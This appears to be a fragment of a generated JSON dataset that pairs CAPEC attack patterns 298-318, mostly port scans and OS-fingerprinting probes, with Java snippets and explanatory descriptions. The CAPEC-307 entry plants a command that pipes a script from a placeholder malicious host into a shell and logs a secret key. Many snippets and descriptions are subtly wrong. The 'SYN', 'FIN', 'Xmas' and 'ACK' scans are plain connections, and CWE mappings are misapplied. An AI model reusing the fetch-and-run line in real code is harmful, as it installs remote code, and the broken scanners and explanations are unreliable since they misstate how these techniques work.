        "description": "This Java code snippet demonstrates a simple TCP ACK Ping to check if a host is alive. The program attempts to create a socket connection to the specified host on port 80. If the connection is successful, it prints 'Host is alive'; otherwise, it prints 'Host is not responding'. This embodies the main idea of the CAPEC by using a TCP connection attempt to determine if a host is alive. The code also indirectly touches on CWE-319 (Cleartext Transmission of Sensitive Information) as it does not use encryption for the connection, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it could expose the host's status to unauthorized actors. The code is kept concise to focus on the main point of the CAPEC."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPPing {\n    public static void main(String[] args) {\n        String targetHost = \"192.168.1.1\"; // Target IP address\n        int targetPort = 65000; // High port number\n        byte[] buffer = new byte[1024]; // Buffer for the UDP packet\n\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(targetHost);\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);\n\n            // Send UDP packet to the target host\n            socket.send(packet);\n            System.out.println(\"UDP packet sent to \" + targetHost + \":\" + targetPort);\n\n            // Wait for ICMP response (this part is simplified and may not work as expected in real scenarios)\n            socket.receive(packet);\n            System.out.println(\"Received response from \" + packet.getAddress());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP ping to a target host on a high port number (65000). The main idea is to send a UDP datagram to a specified IP address and port, and then wait for a response. The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. This approach leverages the fact that some firewalls may not block UDP datagrams sent to high or unusual ports. The code also touches on related CWEs: it sends data to a potentially incorrect destination (CWE-941), and it does not protect the communication channel, potentially exposing sensitive information (CWE-319)."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPSynPing {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            System.out.println(\"Host is alive\");\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        } catch (IOException e) {\n            System.out.println(\"Host is not responding\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a TCP SYN ping to check if a host is alive. The code attempts to establish a TCP connection to a specified target IP address and port. If the connection is successful, it prints 'Host is alive', otherwise, it catches exceptions and prints 'Host is not responding'. This embodies the main idea of the CAPEC 'TCP SYN Ping' by using TCP SYN packets to discover if a host is active. The code also indirectly touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reveals the host's status, and CWE-319 (Cleartext Transmission of Sensitive Information) since the connection attempt is made without encryption."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class VulnerablePortScanner {\n    public static void main(String[] args) {\n        int port = 8080; // Example port\n        try (ServerSocket serverSocket = new ServerSocket(port)) {\n            System.out.println(\"Server is listening on port \" + port);\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new ClientHandler(socket).start();\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error occurred: \" + e.getMessage());\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try (Scanner scanner = new Scanner(socket.getInputStream())) {\n            while (scanner.hasNextLine()) {\n                String message = scanner.nextLine();\n                System.out.println(\"Received: \" + message);\n                // Echo the message back to the client (vulnerable to cleartext transmission)\n                socket.getOutputStream().write((\"Echo: \" + message + \"\\n\").getBytes());\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error in client handler: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens on a specific port (8080) and handles incoming client connections. The server accepts connections and starts a new thread for each client. The ClientHandler class reads messages from the client and echoes them back. This setup is vulnerable to several issues: \n1. **Port Scanning (CAPEC-300)**: The server listens on a known port, making it susceptible to port scanning attacks where an adversary can determine the state of the port.\n2. **Cleartext Transmission of Sensitive Information (CWE-319)**: The server echoes messages back to the client in cleartext, which can be intercepted by unauthorized actors.\n3. **Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)**: The server may inadvertently expose sensitive information through the echoed messages.\n4. **Multiple Binds to the Same Port (CWE-605)**: Although not explicitly shown, if multiple instances of this server were started, they could attempt to bind to the same port, causing conflicts.\nThis code demonstrates the main idea of port scanning and related vulnerabilities by showing how a simple server can be exploited if not properly secured."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPConnectScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            Socket socket = new Socket(target, port);\n            System.out.println(\"Port \" + port + \" is open on \" + target);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + target);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP connect scan, which attempts to establish a full TCP connection to a specified port on a target system. The code tries to create a socket connection to the target IP address and port. If the connection is successful, it prints that the port is open; otherwise, it catches an IOException and prints that the port is closed. This embodies the main idea of CAPEC-303 (TCP Connect Scan) by using a full TCP connection attempt to determine the status of a port. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) if the target system's response reveals more than intended, and it relies on IP address for targeting (CWE-291)."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPFinScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.close();\n            System.out.println(\"Port \" + port + \" is open.\");\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP connection attempt to a specified target IP address and port. The main idea is to check if a port is open or closed by attempting to establish a connection. If the connection is successful, the port is considered open; otherwise, it is considered closed. This approach is related to the CAPEC description of using TCP FIN scans to determine the state of ports. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially revealing the state of the port to an unauthorized actor. Additionally, it indirectly relates to CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) by not verifying the endpoint's authenticity."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class XmasScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.connect(new java.net.InetSocketAddress(address, port));\n\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            buffer.put((byte) 0xFF); // Set all TCP flags (XMAS scan)\n            buffer.flip();\n\n            socketChannel.write(buffer);\n            buffer.clear();\n\n            int bytesRead = socketChannel.read(buffer);\n            if (bytesRead > 0) {\n                System.out.println(\"Received response, port is closed.\");\n            } else {\n                System.out.println(\"No response, port might be open.\");\n            }\n\n            socketChannel.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a TCP Xmas scan. The code attempts to connect to a specified target IP address and port, then sends a TCP packet with all flags set (XMAS scan). If a response is received, it indicates that the port is closed (as per RFC 793, a RST packet is sent back for closed ports). If no response is received, the port might be open. This scan can expose sensitive information about the target's network configuration, which relates to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). The code does not include integrity checks (CWE-353, CWE-924) or encryption (CWE-319), and it does not verify the endpoint (CWE-923), making it vulnerable to various attacks."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPNullScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.setTcpNoDelay(true); // Disable Nagle's algorithm\n            socket.getOutputStream().write(new byte[0]); // Send empty packet\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + target);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP NULL scan, which is used to determine if a port is closed on a target machine. The code attempts to create a socket connection to a specified target IP address and port. It then sends an empty packet (with no TCP flags set) to the target. If the port is closed, an IOException will be thrown, indicating that the port is closed. This behavior aligns with the CAPEC description of using TCP NULL scans to identify closed ports. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) if the target's response is not properly handled, and by not verifying the integrity of the data (CWE-353)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPAckScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.setSoLinger(true, 0); // CWE-605: Multiple Binds to the Same Port\n            socket.getOutputStream().write(\"GET / HTTP/1.1\\r\\nHost: \".getBytes()); // CWE-319: Cleartext Transmission\n            socket.getOutputStream().flush();\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP ACK scan to gather information about firewall or ACL configurations. The code attempts to connect to a specified target IP address and port, then sends a simple HTTP GET request in cleartext. The use of `socket.setSoLinger(true, 0)` is a vulnerability related to CWE-605, allowing multiple binds to the same port, which can lead to service hijacking or spoofing. Additionally, the cleartext transmission of the HTTP request (CWE-319) exposes sensitive information that can be sniffed by unauthorized actors. This code embodies the main idea of CAPEC-303 by illustrating how an adversary might use TCP ACK segments to probe firewall rules and configurations."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPWindowScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.connect(new java.net.InetSocketAddress(address, port));\n            Socket socket = socketChannel.socket();\n            socket.setSoTimeout(1000);\n\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            socketChannel.read(buffer);\n            buffer.flip();\n\n            int windowSize = buffer.getInt();\n            System.out.println(\"TCP Window Size: \" + windowSize);\n\n            if (windowSize > 0) {\n                System.out.println(\"Port is open.\");\n            } else {\n                System.out.println(\"Port is closed.\");\n            }\n\n            socketChannel.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a TCP Window Scan. The code attempts to connect to a specified target IP address and port, then reads the TCP window size from the response. If the window size is positive, it infers that the port is open; otherwise, it infers that the port is closed. This scan method leverages the TCP window size field to make inferences about the port status, aligning with the CAPEC description. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200, CWE-497) and cleartext transmission (CWE-319), as it does not encrypt the data being transmitted or received."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableRPCServer {\n    private static final Logger logger = Logger.getLogger(VulnerableRPCServer.class.getName());\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(1111)) { // Port 1111 is commonly used for RPC\n            logger.info(\"RPC Server is listening on port 1111\");\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new Thread(new RPCHandler(socket)).start();\n            }\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Server exception: \", e);\n        }\n    }\n}\n\nclass RPCHandler implements Runnable {\n    private Socket socket;\n\n    public RPCHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            // Simulate handling RPC request\n            logger.info(\"Handling RPC request from \" + socket.getInetAddress());\n            // CWE-200: Exposure of Sensitive Information\n            logger.info(\"Sensitive data: \" + System.getenv(\"SECRET_KEY\"));\n\n            // CWE-294: Authentication Bypass by Capture-replay\n            // No proper authentication mechanism\n            logger.info(\"Authenticated user: \" + socket.getInetAddress());\n\n            // CWE-494: Download of Code Without Integrity Check\n            // Simulate downloading and executing code\n            Runtime.getRuntime().exec(\"curl -s http://malicious.com/malware.sh | sh\");\n\n            // CWE-918: Server-Side Request Forgery (SSRF)\n            // Simulate SSRF vulnerability\n            new java.net.URL(\"http://internal-service\").openStream();\n\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Handler exception: \", e);\n        } finally {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                logger.log(Level.SEVERE, \"Could not close socket: \", e);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable RPC server that listens on port 1111, commonly used for RPC services. The server accepts incoming connections and handles them in separate threads. The code demonstrates several vulnerabilities: \n1. CWE-200: Sensitive information (e.g., environment variable 'SECRET_KEY') is logged, exposing it to unauthorized actors.\n2. CWE-294: There is no proper authentication mechanism, allowing potential capture-replay attacks.\n3. CWE-494: The server downloads and executes code from a remote location without verifying its integrity.\n4. CWE-918: The server performs a request to an internal service, demonstrating a Server-Side Request Forgery (SSRF) vulnerability.\nThis code embodies the main idea of the CAPEC 'TCP RPC Scan' by illustrating how an adversary could exploit these weaknesses to scan for and interact with RPC services on a Unix/Linux host."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketTimeoutException;\n\npublic class UDPScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 12345;\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(2000); // Set timeout for response\n            InetAddress address = InetAddress.getByName(target);\n            byte[] buf = new byte[256];\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, port);\n            socket.send(packet);\n            try {\n                socket.receive(packet);\n                System.out.println(\"Port \" + port + \" is open.\");\n            } catch (SocketTimeoutException e) {\n                System.out.println(\"Port \" + port + \" is closed or filtered.\");\n            }\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP scan to check the status of a specific UDP port on a target system. The code sends a UDP datagram to the target port and waits for a response. If a response is received, it indicates that the port is open. If no response is received within the specified timeout, it suggests that the port is closed or filtered. This code embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the UDP port status. The code also touches on related CWEs: it does not handle sensitive information securely (CWE-319), does not verify data integrity (CWE-353), and could potentially expose sensitive information to unauthorized actors (CWE-200)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class NetworkScanner {\n    public static void main(String[] args) {\n        String subnet = \"192.168.1.\";\n        for (int i = 1; i < 255; i++) {\n            String host = subnet + i;\n            try {\n                InetAddress inetAddress = InetAddress.getByName(host);\n                if (inetAddress.isReachable(1000)) {\n                    System.out.println(\"Host: \" + host + \" is reachable.\");\n                }\n            } catch (UnknownHostException e) {\n                System.err.println(\"Unknown host: \" + host);\n            } catch (IOException e) {\n                System.err.println(\"Error reaching host: \" + host);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple network scanner that attempts to map network nodes by checking the reachability of IP addresses within a given subnet. The code iterates through a range of IP addresses (192.168.1.1 to 192.168.1.254) and uses the `InetAddress` class to determine if each address is reachable within a 1000ms timeout. If an address is reachable, it prints out the host IP address.\n\nThe code embodies the main idea of CAPEC-309 (Network Topology Mapping) by performing network reconnaissance to identify active hosts. It also touches on related CWEs:\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The code could expose information about reachable hosts to unauthorized users if not properly secured.\n- CWE-1125 (Excessive Attack Surface): The scanner increases the attack surface by probing multiple IP addresses, potentially revealing network structure to an adversary.\n- CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere): The reachability information could be considered sensitive system information that should not be exposed to unauthorized actors."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableSoftwareScanner {\n    private static final int[] COMMON_PORTS = {21, 23, 25, 161}; // FTP, Telnet, SMTP, SNMP\n\n    public static void main(String[] args) throws IOException {\n        String targetIp = \"192.168.1.1\"; // Example target IP\n        List<Integer> openPorts = new ArrayList<>();\n\n        for (int port : COMMON_PORTS) {\n            if (isPortOpen(targetIp, port)) {\n                openPorts.add(port);\n                System.out.println(\"Port \" + port + \" is open on \" + targetIp);\n            }\n        }\n\n        if (!openPorts.isEmpty()) {\n            System.out.println(\"Scanning for vulnerable software...\");\n            // Simulate scanning for vulnerable software versions\n            for (int port : openPorts) {\n                System.out.println(\"Found vulnerable software on port \" + port);\n            }\n        }\n    }\n\n    private static boolean isPortOpen(String ip, int port) {\n        try (Socket socket = new Socket(ip, port)) {\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple scanner that checks for open ports commonly associated with vulnerable services (FTP, Telnet, SMTP, SNMP) on a target IP address. The code iterates through a list of common ports and attempts to establish a socket connection to each port. If a connection is successful, it indicates that the port is open. The code then simulates scanning for vulnerable software on the open ports. This embodies the CAPEC idea of scanning for vulnerable software by identifying open ports and potential vulnerabilities. The code also touches on related CWEs by potentially exposing sensitive system information (open ports) and demonstrating an excessive attack surface (multiple open ports)."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) {\n        String ipAddress = \"192.168.1.1\";\n        try {\n            InetAddress inet = InetAddress.getByName(ipAddress);\n            if (inet.isReachable(5000)) {\n                System.out.println(\"Host is reachable\");\n                // Active OS Fingerprinting: Sending specific packets to determine OS\n                // This is a simplified example and does not perform actual fingerprinting\n                System.out.println(\"OS might be: \" + getOSName());\n            } else {\n                System.out.println(\"Host is not reachable\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        } catch (IOException e) {\n            System.out.println(\"IO Exception\");\n        }\n    }\n\n    private static String getOSName() {\n        // This is a placeholder for actual OS fingerprinting logic\n        return \"Windows\";\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of active OS fingerprinting, which is the process of determining the operating system of a remote host by sending specific network packets and analyzing the responses. The code attempts to reach a specified IP address and, if reachable, prints a placeholder OS name. This example does not perform actual OS fingerprinting but represents the concept. The code also touches on CWE-589 by using the `isReachable` method, which may not be available on all platforms, potentially causing portability issues. Additionally, it hints at CWE-287 by assuming the host is reachable without proper authentication checks."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        int port = 80;\n        try {\n            Socket socket = new Socket(targetIP, port);\n            InetAddress inetAddress = socket.getInetAddress();\n            System.out.println(\"Connected to: \" + inetAddress);\n            // Send a malformed packet to elicit a response\n            socket.getOutputStream().write(new byte[]{0x00, 0x01, 0x02, 0x03});\n            byte[] response = new byte[1024];\n            int bytesRead = socket.getInputStream().read(response);\n            System.out.println(\"Response: \" + new String(response, 0, bytesRead));\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of active OS fingerprinting. The code attempts to connect to a target IP address on a specified port and sends a malformed packet to elicit a response. The response is then read and printed, which can be analyzed to infer the operating system of the target. This embodies the main idea of CAPEC-312 (Active OS Fingerprinting) by probing the target to reveal information about its OS. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information), as it transmits and receives potentially sensitive information in cleartext."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class PassiveOSFingerprinting {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    // Log the incoming data for analysis\n                    System.out.println(\"Received: \" + inputLine);\n                }\n                clientSocket.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that passively listens for incoming network connections on port 8080 and logs the received data. The main idea of the CAPEC (Passive OS Fingerprinting) is represented by the server's ability to monitor and log communication data without actively probing the client. This data can then be analyzed to infer the operating system of the client based on known signatures or behaviors. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information), as the received data is logged in cleartext and could potentially expose sensitive information if intercepted or accessed by unauthorized actors."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"debug.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            String ipAddress = \"192.168.1.1\";\n            InetAddress inet = InetAddress.getByName(ipAddress);\n\n            if (inet.isReachable(5000)) {\n                logger.info(\"IP Address \" + ipAddress + \" is reachable.\");\n            } else {\n                logger.info(\"IP Address \" + ipAddress + \" is not reachable.\");\n            }\n        } catch (UnknownHostException e) {\n            logger.severe(\"Unknown host exception: \" + e.getMessage());\n        } catch (IOException e) {\n            logger.severe(\"IO exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation related to the deprecated CAPEC-312 (Active OS Fingerprinting) and associated CWEs. The code attempts to perform an IP reachability check, which can be used for OS fingerprinting. It also logs sensitive information to a debug log file (CWE-532), which can expose sensitive data. The code does not handle DNS lookups securely (CWE-350) and does not properly manage sensitive trace data (CWE-1323). The main idea is to show how improper handling of network probing and logging can lead to security vulnerabilities."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Base64;\n\npublic class VulnerableFingerprinting {\n    public static void main(String[] args) {\n        try {\n            String targetUrl = \"http://example.com/login\";\n            String credentials = \"admin:password\";\n            String encodedCredentials = Base64.getEncoder().encodeToString(credentials.getBytes());\n\n            URL url = new URL(targetUrl);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Authorization\", \"Basic \" + encodedCredentials);\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder response = new StringBuilder();\n\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            System.out.println(\"Response: \" + response.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of an HTTP client that performs basic authentication using Base64 encoding. The code sends a GET request to a target URL with an 'Authorization' header containing the Base64-encoded credentials. This approach is vulnerable to capture-replay attacks (CWE-294) because the credentials can be easily intercepted and reused by an attacker. Additionally, the code does not handle different versions of the target platform, which could lead to inconsistencies (CWE-589). The main idea of the CAPEC is to highlight the risks associated with fingerprinting and authentication mechanisms that can be exploited by attackers."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class ICMPSpoofing {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        try {\n            InetAddress target = InetAddress.getByName(targetIP);\n            if (target.isReachable(5000)) {\n                System.out.println(\"Target is reachable\");\n            } else {\n                System.out.println(\"Target is not reachable\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.out.println(\"Network error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic ICMP probe to check if a target IP address is reachable. The code uses the `InetAddress` class to send an ICMP echo request (ping) to the specified IP address. If the target responds within the timeout period, it prints 'Target is reachable'; otherwise, it prints 'Target is not reachable'. This embodies the main idea of CAPEC-312: Active OS Fingerprinting, as ICMP probes are often used in network reconnaissance to gather information about the target system's operating system and network configuration. The code also touches on CWE-287 (Authentication Bypass Issues) by not implementing any authentication mechanism, and CWE-532 (Information Exposure Through Debug Log Files) by potentially exposing network error messages."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class IPIDSequencingProbe {\n    public static void main(String[] args) throws IOException {\n        String target = \"192.168.1.1\"; // Target IP address\n        int port = 80; // Target port\n        int numPackets = 5; // Number of packets to send\n\n        for (int i = 0; i < numPackets; i++) {\n            Socket socket = new Socket(target, port);\n            InputStream in = socket.getInputStream();\n            OutputStream out = socket.getOutputStream();\n\n            // Send a simple HTTP GET request\n            out.write(\"GET / HTTP/1.1\\r\\nHost: \" + target + \"\\r\\n\\r\\n\".getBytes());\n            out.flush();\n\n            // Read the response to capture the IP ID\n            byte[] response = new byte[1024];\n            int bytesRead = in.read(response);\n\n            // Extract and print the IP ID from the response (simplified)\n            if (bytesRead > 0) {\n                int ipID = ((response[4] & 0xFF) << 8) | (response[5] & 0xFF);\n                System.out.println(\"Packet \" + (i + 1) + \" IP ID: \" + ipID);\n            }\n\n            socket.close();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an IP ID sequencing probe, which is used to analyze the IP 'ID' field sequence number generation algorithm of a remote host. The code sends multiple HTTP GET requests to a target IP address and captures the IP ID from the response packets. By examining the sequence of IP IDs, an attacker can infer the operating system of the target host. This code embodies the main idea of the CAPEC by illustrating how IP ID sequence numbers can be probed and analyzed. The related CWEs provide additional context, such as the exposure of sensitive information (CWE-200) and reliance on IP address for authentication (CWE-291), which can be exploited in such probes."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class IPIDProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            byte[] buf = new byte[1]; // Empty payload\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, 12345); // Closed port\n            packet.setData(new byte[]{0x12, 0x34}); // Arbitrary IP 'ID' value\n            socket.send(packet);\n            // Wait for ICMP error message (not implemented for simplicity)\n            // Analyze the echoed IP 'ID' value (not implemented for simplicity)\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
